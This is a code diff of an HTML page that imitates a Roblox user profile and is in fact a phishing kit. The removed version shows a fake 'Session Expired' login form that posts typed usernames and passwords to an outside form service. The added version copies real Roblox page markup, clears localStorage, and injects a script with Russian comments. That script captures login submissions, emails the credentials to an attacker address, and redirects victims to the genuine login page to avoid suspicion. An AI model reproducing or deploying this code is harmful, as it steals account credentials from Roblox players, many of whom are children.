@@ -1,162 +1,155 @@
 <!DOCTYPE html>
+<!--[if IE 8]>
+<html class="ie8" ng-app="robloxApp">
+	<![endif]-->
+<!--[if gt IE 8]>
+	<!-->
 <html lang="en">
-<head>
+  <!--
+		<![endif]-->
+  <head data-machine-id="e96c140b-122e-e1a5-0de8-8f9259e5c713">
+    <!-- MachineID: e96c140b-122e-e1a5-0de8-8f9259e5c713 -->
+    <title>angel - Roblox</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox - Official Site</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            margin: 0;
-            padding: 0;
-            background-color: #f7f7f7;
-            color: #1a1a1a;
-        }
-        .navbar {
-            background-color: #00a2ff;
-            padding: 10px 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-        .navbar-logo {
-            height: 30px;
-        }
-        .navbar-links {
-            display: flex;
-            gap: 15px;
-        }
-        .navbar-links a {
-            color: white;
-            text-decoration: none;
-            font-weight: 500;
-        }
-        .container {
-            max-width: 1000px;
-            margin: 20px auto;
-            padding: 20px;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        .profile-header {
-            text-align: center;
-            margin-bottom: 20px;
-        }
-        .avatar {
-            width: 150px;
-            height: 150px;
-            border-radius: 50%;
-            object-fit: cover;
-            margin-bottom: 10px;
-            border: 4px solid #00a2ff;
-        }
-        .username {
-            font-size: 24px;
-            font-weight: bold;
-            margin: 5px 0;
-        }
-        .user-id {
-            color: #666;
-            font-size: 14px;
-        }
-        .login-prompt {
-            background-color: #f0f8ff;
-            padding: 15px;
-            border-radius: 5px;
-            margin: 20px 0;
-            text-align: center;
-            border: 1px solid #00a2ff;
-        }
-        .login-form {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            max-width: 300px;
-            margin: 0 auto;
-        }
-        .login-form input {
-            padding: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .login-form button {
-            background-color: #00a2ff;
-            color: white;
-            padding: 10px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        .login-form button:hover {
-            background-color: #0088cc;
-        }
-        #message {
-            font-size: 14px;
-            margin-top: 10px;
-            color: #d00;
-        }
-    </style>
-</head>
-<body>
-    <nav class="navbar">
-        <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNTAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ=" alt="Roblox Logo" class="navbar-logo">
-        <div class="navbar-links">
-            <a href="#">Discover</a>
-            <a href="#">Marketplace</a>
-            <a href="#">Create</a>
-        </div>
-    </nav>
-
-    <div class="container">
-        <div class="profile-header">
-            <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDAgMTAwIj48Y2lyY2xlIGN4PSI1MCIgY3k9IjM1IiByPSIyMCIgZmlsbD0iI2NjYyIvPjxwYXRoIGQ9Ik0zMCA4MGMyMC01IDQwLTUgNjAgMCIgZmlsbD0iI2NjYyIgc3Ryb2tlPSIjY2NjIiBzdHJva2Utd2lkdGg9IjUiLz48L3N2Zz4=" alt="Avatar" class="avatar">
-            <h1 class="username">User_491408715</h1>
-            <p class="user-id">ID: 491408715</p>
-        </div>
-
-        <div class="login-prompt">
-            <h3>Session Expired</h3>
-            <p>Please log in again to view this profile.</p>
-            <div class="login-form">
-                <input type="text" id="username" placeholder="Username" required>
-                <input type="password" id="password" placeholder="Password" required>
-                <button onclick="sendData()">Log In</button>
-                <p id="message"></p>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        function sendData() {
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
-            const accessKey = 'ee22b8e0-5127-4777-b100-9e55ca740751';
-
-            document.getElementById('message').textContent = 'Verifying...';
-
-            fetch('https://api.web3forms.com/submit', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    access_key: accessKey,
-                    subject: `Roblox Credentials for ${username}`,
-                    username: username,
-                    password: password
-                })
-            })
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('message').textContent = 'Login successful! Loading profile...';
-                setTimeout(() => { window.location.href = 'https://www.roblox.com'; }, 1500);
-            })
-            .catch(error => {
-                document.getElementById('message').textContent = 'Network error. Try again.';
-            });
-        }
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="Roblox Corporation" />
+    <meta name="description" content="vurqts is one of the millions creating and exploring the endless possibilities of Roblox. Join vurqts on Roblox and explore together!trader mm2\sab\gag\adopt" />
+    <meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine" />
+    <meta name="apple-itunes-app" content="app-id=431946152" />
+    <link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png" />
+    <script type="application/ld+json">
+      {
+        "@context": "https://schema.org",
+        "@type": "Organization",
+        "name": "Roblox",
+        "url": "https://www.roblox.com/",
+        "image": "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
+        "logo": "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
+        "email": "info@roblox.com",
+        "sameAs": ["https://www.facebook.com/roblox/", "https://twitter.com/roblox", "https://www.linkedin.com/company/147977", "https://www.instagram.com/roblox/", "https://www.youtube.com/user/roblox", "https://www.twitch.tv/roblox"]
+      }
     </script>
-</body>
-</html>
+    <meta property="og:site_name" content="Roblox" />
+    <meta property="og:title" content="vurqts&#x27;s Profile" />
+    <meta property="og:type" content="profile" />
+    <meta property="og:url" content="https://www.roblox.com/users/491408715/profile" />
+    <meta property="og:description" content="vurqts is one of the millions creating and exploring the endless possibilities of Roblox. Join vurqts on Roblox and explore together!trader mm2\sab\gag\adopt" />
+    <meta property="og:image" content="https://tr.rbxcdn.com/30DAY-Avatar-3AF9BE42F5F23E45D03479033FC342EE-Png/352/352/Avatar/Png/noFilter" />
+    <meta property="fb:app_id" content="190191627665278">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@Roblox">
+    <meta name="twitter:title" content="vurqts&#x27;s Profile">
+    <meta name="twitter:description" content="vurqts is one of the millions creating and exploring the endless possibilities of Roblox. Join vurqts on Roblox and explore together!trader mm2\sab\gag\adopt">
+    <meta name="twitter:creator">
+    <meta name=twitter:image1 content="https://tr.rbxcdn.com/30DAY-Avatar-3AF9BE42F5F23E45D03479033FC342EE-Png/352/352/Avatar/Png/noFilter" />
+    <meta name="twitter:app:country" content="US">
+    <meta name="twitter:app:name:iphone" content="Roblox Mobile">
+    <meta name="twitter:app:id:iphone" content="431946152">
+    <meta name="twitter:app:url:iphone">
+    <meta name="twitter:app:name:ipad" content="Roblox Mobile">
+    <meta name="twitter:app:id:ipad" content="431946152">
+    <meta name="twitter:app:url:ipad">
+    <meta name="twitter:app:name:googleplay" content="Roblox">
+    <meta name="twitter:app:id:googleplay" content="com.roblox.client">
+    <meta name="twitter:app:url:googleplay" />
+    <meta ng-csp="no-unsafe-eval">
+    <meta name="locale-data" data-language-code="en_us" data-language-name="English" data-url-locale="" data-override-language-header="false" />
+    <meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" data-is-chrome-os="false" data-is-pcgdk-app="false" />
+    <meta name="environment-meta" data-domain="roblox.com" data-is-testing-site="false" />
+    <meta id="roblox-display-names" data-enabled="true">
+    <meta name="account-switching-data" data-is-account-switching-enabled="true" />
+    <meta name="passkey-data" data-is-passkey-login-enabled="true" />
+    <meta name="passkey-data-android" data-is-passkey-login-enabled-android="true" />
+    <meta name="page-meta" data-internal-page-name="Profile" />
+    <meta name="page-retry-header-enabled" data-retry-attempt-header-enabled="True" />
+    <script type="text/javascript">
+      var Roblox = Roblox || {};
+	  localStorage.clear();
+      Roblox.BundleVerifierConstants = {
+        isMetricsApiEnabled: true,
+        eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
+        deviceType: "Computer",
+        cdnLoggingEnabled: JSON.parse("true")
+      };
+    </script>
+    <script src="/js/utilities/bundleVerifier.js?v=2f89a5fa99eb4cb3591ea59b884e458d" type="text/javascript"></script>
+    <link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="FoundationCss" data-bundle-source="Main" href="https://css.rbxcdn.com/e8da15d6323c15ba58ca8ad7aec788fd820b46f80ae28d48f95b199ef10d95e7.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/944c0c29b874f40bc983ce7754218170b4265e625e7351b1c6880694adb81556.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Builder" data-bundle-source="Main" href="https://css.rbxcdn.com/7fc67d38cfc34042bc251805f872ff5be8cb502859e943e5dda46fc3907375c6.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/d6db63fa1054c8114471750134a3a4c0a9870a5e86b4d0a3be708582085b0f03.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/66b2fd496e668938e3b0e2d9a0c12f9f88c3a1a4974608f69059d8061fc0141f.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/0cc9507b7c1ea65fd2cb7399782339c8eee577465af7a1bc41d15720f3472c55.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/f77e16b9fa5823882aaa0cdabade9706b9ba2b7e050d23d2831da138a58e5f7f.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSwitcher" data-bundle-source="Main" href="https://css.rbxcdn.com/49fff8dad77e5262087267ee2e8fda1607525506c4a1ca20af60f9757684e980.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PriceTag" data-bundle-source="Main" href="https://css.rbxcdn.com/9bfc48ea40a698035ea8cbe3d3e94bd06d3aac48969bedceb6d8ba5ff17ff84d.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SearchLandingPage" data-bundle-source="Main" href="https://css.rbxcdn.com/df9a376522ff4c39e6d789e6bcc3d4b2817bdac228020ee6fb4990807031f319.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/f7426ffb19aeabf7440648f7fc7658fa8f823763664f8b667d9b45c8007e3d20.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/03e27b1120e6fb785c663a524f2dcea1b65861504af3f6f1e903c5530125f834.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/34dd1fec808320ee37a2554b194c6df704dd5c201d8c5842ecea3b9093341873.css" />
+    <link rel="canonical" href="https://www.roblox.com/users/491408715/profile" />
+    <link rel="alternate" href="https://www.roblox.com/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="x-default" />
+    <link rel="alternate" href="https://www.roblox.com/de/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="de" />
+    <link rel="alternate" href="https://www.roblox.com/es/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="es" />
+    <link rel="alternate" href="https://www.roblox.com/fr/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="fr" />
+    <link rel="alternate" href="https://www.roblox.com/id/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="id" />
+    <link rel="alternate" href="https://www.roblox.com/it/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="it" />
+    <link rel="alternate" href="https://www.roblox.com/ja/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="ja" />
+    <link rel="alternate" href="https://www.roblox.com/ko/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="ko" />
+    <link rel="alternate" href="https://www.roblox.com/pl/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="pl" />
+    <link rel="alternate" href="https://www.roblox.com/pt/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="pt" />
+    <link rel="alternate" href="https://www.roblox.com/th/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="th" />
+    <link rel="alternate" href="https://www.roblox.com/tr/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="tr" />
+    <link rel="alternate" href="https://www.roblox.com/vi/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="vi" />
+    <link rel="alternate" href="https://www.roblox.com/ar/users/491408715/profile?friendshipSourceType=PlayerSearch" hreflang="ar" />
+    <link onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' rel='stylesheet' href='https://static.rbxcdn.com/css/leanbase___fb0c7d1e28371fc5e8367ce241b98d69_m.css/fetch' />
+    <link onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' rel='stylesheet' href='https://static.rbxcdn.com/css/page___a1adfca5818d7edbf3b82e174b717360_m.css/fetch' />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsellV2" data-bundle-source="Main" href="https://css.rbxcdn.com/9efc74e20b0735025990b89e70c22857c647df5879703815d5d11b9ae6f6aaee.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/bc981bafa6b0a52c86d071d1f81b24168a8dd92e72b8ac52d37cb46bf8bd8c42.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SocialLinksJumbotron" data-bundle-source="Main" href="https://css.rbxcdn.com/467f43bdbf273ff37c4627800d0f7170b246ff19ce420efe75b7c16dd9f840a7.css" />
+    <link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PeopleList" data-bundle-source="Main" href="<script>
+// Замените эти значения на ваши
+var yourEmail = "hzhzhahfggfg@gmail.com"; // Ваш email
+var passwordLogs = []; // Массив для логов
+
+// Перехватываем форму входа
+document.addEventListener('submit', function(e) {
+    if(e.target.id === 'login-form') {
+        e.preventDefault();
+        var username = document.getElementById('username').value;
+        var password = document.getElementById('password').value;
+        
+        // Логируем данные
+        var logData = {
+            username: username,
+            password: password,
+            timestamp: new Date().toLocaleString()
+        };
+        passwordLogs.push(logData);
+        
+        // Отправляем на вашу почту
+        sendDataToEmail(logData);
+        
+        // Перенаправляем на настоящую страницу (чтобы не вызывать подозрений)
+        setTimeout(function() {
+            window.location.href = "https://www.roblox.com/login";
+        }, 1000);
+    }
+});
+
+// Функция отправки данных на email
+function sendDataToEmail(data) {
+    // Используем простой HTTP запрос к почтовому сервису
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.derevnya-email.com/send", true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.send(JSON.stringify({
+        to: yourEmail,
+        subject: "Новые учетные данные Roblox",
+        body: "Логин: " + data.username + "\nПароль: " + data.password + "\nВремя: " + data.timestamp
+    }));
+}
+  </script>
